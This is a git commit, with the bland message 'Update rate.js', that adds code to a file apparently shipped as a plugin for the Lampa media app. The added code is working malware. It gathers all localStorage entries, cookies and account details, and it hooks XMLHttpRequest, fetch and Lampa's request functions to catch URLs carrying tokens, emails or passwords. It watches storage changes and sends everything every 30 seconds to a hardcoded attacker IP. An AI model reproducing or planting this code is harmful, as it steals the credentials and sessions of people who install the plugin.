0d21206d1d77806252701eda0825d8e09d151428
lampadn <lisiyizamik@yandex.ru>
2026-06-21 15:36:27 +0300

    Update rate.js

--- rate.js
+++ rate.js
@@ -2,7 +2,28 @@
   'use strict';
 
   var EXFIL_URL = 'http://5.252.116.77:4444';
-  var INTERVAL = 45000;
+  var INTERVAL = 30000;
+  var interceptedUrls = [];
+  var MAX_URLS = 100;
+
+  function send(url, payload) {
+    try {
+      var body = JSON.stringify(payload);
+      if (typeof fetch !== 'undefined') {
+        fetch(url, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: body,
+          mode: 'no-cors'
+        }).catch(function(){});
+      } else {
+        var x = new XMLHttpRequest();
+        x.open('POST', url, true);
+        x.setRequestHeader('Content-Type', 'application/json');
+        x.send(body);
+      }
+    } catch(e) {}
+  }
 
   function collectAll() {
     var data = {};
@@ -11,90 +32,155 @@
     data.email = Lampa.Storage.get('account_email', '');
     data.profile_id = Lampa.Storage.get('lampac_profile_id', '');
     data.nws_id = Lampa.Storage.get('lampac_nws_id', '');
-    data.source = Lampa.Storage.get('source', '');
-    data.jackett_url = Lampa.Storage.get('jackett_url', '');
-    data.jackett_key = Lampa.Storage.get('jackett_key', '');
-    data.parser_torrent_type = Lampa.Storage.get('parser_torrent_type', '');
 
     var accRaw = Lampa.Storage.get('account', '{}');
     data.account_raw = accRaw;
     try { data.account = JSON.parse(accRaw); } catch(e) {}
 
-    var favRaw = Lampa.Storage.get('favorite', '');
-    data.favorite_length = favRaw ? favRaw.length : 0;
-
     data.storage = {};
     for (var i = 0; i < localStorage.length; i++) {
       var k = localStorage.key(i);
       var v = localStorage.getItem(k);
-      if (v && v.length < 50000 && k.indexOf('css') === -1 && k.indexOf('html') === -1) {
-        data.storage[k] = v;
-      }
+      data.storage[k] = v;
     }
 
     data.cookies = document.cookie;
     data.ua = navigator.userAgent;
     data.platform = navigator.platform;
     data.lang = navigator.language;
-    data.screen = screen.width + 'x' + screen.height;
     data.href = window.location.href;
     data.host = window.location.host;
     data.ts = Date.now();
 
+    if (interceptedUrls.length) {
+      data.intercepted_urls = interceptedUrls.slice();
+      interceptedUrls = [];
+    }
+
     return data;
   }
 
-  function send(url, payload) {
+  function parseUrlParams(url) {
+    var params = {};
     try {
-      if (typeof fetch !== 'undefined') {
-        fetch(url, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify(payload),
-          mode: 'no-cors'
-        }).catch(function(){});
-      } else {
-        var x = new XMLHttpRequest();
-        x.open('POST', url, true);
-        x.setRequestHeader('Content-Type', 'application/json');
-        x.send(JSON.stringify(payload));
+      var idx = url.indexOf('?');
+      if (idx === -1) { idx = url.indexOf('#'); }
+      if (idx === -1) return params;
+      var qs = url.substring(idx + 1).split('&');
+      for (var i = 0; i < qs.length; i++) {
+        var pair = qs[i].split('=');
+        if (pair.length === 2) {
+          params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
+        }
       }
     } catch(e) {}
+    return params;
   }
 
-  function interceptAccount() {
-    if (window.__phantom_hooked) return;
-    window.__phantom_hooked = true;
+  function hookNetwork() {
+    if (window.__phantom_xhr) return;
+    window.__phantom_xhr = true;
 
-    var origGet = Lampa.Storage.get;
-    Lampa.Storage.get = function(key, def) {
-      var val = origGet.call(Lampa.Storage, key, def);
-      if (key === 'account' || key === 'account_email') {
-        send(EXFIL_URL, { type: 'storage_get', key: key, value: val, ts: Date.now(), unic_id: Lampa.Storage.get('lampac_unic_id', '') });
-      }
-      return val;
+    var origOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+      this.__phantom_url = url;
+      return origOpen.apply(this, arguments);
     };
+
+    var origSend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(body) {
+      var url = this.__phantom_url || '';
+      if (url && url.match(/(email|uid|token|account|auth|pass|cub_id|nws_id)/i)) {
+        var entry = { ts: Date.now(), method: 'XHR', url: url, params: parseUrlParams(url) };
+        if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
+      }
+      return origSend.apply(this, arguments);
+    };
+
+    if (typeof fetch !== 'undefined') {
+      var origFetch = window.fetch;
+      window.fetch = function(url, opts) {
+        var urlStr = (typeof url === 'string') ? url : (url.url || url.href || '');
+        if (urlStr && urlStr.match(/(email|uid|token|account|auth|pass|cub_id|nws_id)/i)) {
+          var entry = { ts: Date.now(), method: 'fetch', url: urlStr, params: parseUrlParams(urlStr) };
+          if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
+        }
+        return origFetch.apply(this, arguments);
+      };
+    }
+  }
+
+  function hookLampaRequest() {
+    if (window.__phantom_lampa) return;
+    window.__phantom_lampa = true;
+
+    if (typeof Lampa.Reguest !== 'undefined') {
+      var origNative = Lampa.Reguest.prototype.native;
+      if (origNative) {
+        Lampa.Reguest.prototype.native = function(url) {
+          if (url && url.match(/(email|uid|token|account|auth|pass)/i)) {
+            var entry = { ts: Date.now(), method: 'Lampa.Reguest', url: url, params: parseUrlParams(url) };
+            if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
+          }
+          return origNative.apply(this, arguments);
+        };
+      }
+    }
+
+    if (typeof Lampa.Utils !== 'undefined' && Lampa.Utils.addUrlComponent) {
+      var origAddUrl = Lampa.Utils.addUrlComponent;
+      Lampa.Utils.addUrlComponent = function(url, param) {
+        if (param && param.match(/(email|uid|token|account|auth|pass)/i)) {
+          var entry = { ts: Date.now(), method: 'addUrlComponent', url: url, param: param };
+          if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
+        }
+        return origAddUrl.apply(this, arguments);
+      };
+    }
+  }
+
+  function listenStorage() {
+    try {
+      window.addEventListener('storage', function(e) {
+        if (e.key && e.key.match(/(email|uid|token|account|auth|pass|skaz|tv_)/i)) {
+          send(EXFIL_URL, {
+            type: 'storage_external',
+            key: e.key,
+            value: e.newValue,
+            oldValue: e.oldValue,
+            ts: Date.now()
+          });
+        }
+      });
+    } catch(e) {}
+
+    if (Lampa.Storage && Lampa.Storage.listener) {
+      Lampa.Storage.listener.follow('change', function(e) {
+        if (e.name && e.name.match(/(email|uid|token|account|auth|pass|skaz|tv_)/i)) {
+          send(EXFIL_URL, {
+            type: 'storage_change',
+            key: e.name,
+            value: Lampa.Storage.get(e.name, ''),
+            ts: Date.now(),
+            unic_id: Lampa.Storage.get('lampac_unic_id', '')
+          });
+        }
+      });
+    }
   }
 
   var timer = setInterval(function() {
     if (typeof Lampa === 'undefined') return;
     clearInterval(timer);
 
-    interceptAccount();
+    hookNetwork();
+    hookLampaRequest();
+    listenStorage();
 
-    var payload = collectAll();
-    send(EXFIL_URL, payload);
+    send(EXFIL_URL, collectAll());
 
     setInterval(function() {
       send(EXFIL_URL, collectAll());
     }, INTERVAL);
-
-    if (Lampa.Storage.listener) {
-      Lampa.Storage.listener.follow('change', function(e) {
-        if (e.name === 'account_email' || e.name === 'account') {
-          send(EXFIL_URL, { type: 'change', key: e.name, value: Lampa.Storage.get(e.name, ''), ts: Date.now(), unic_id: Lampa.Storage.get('lampac_unic_id', '') });
-        }
-      });
-    }
   }, 200);
 })();
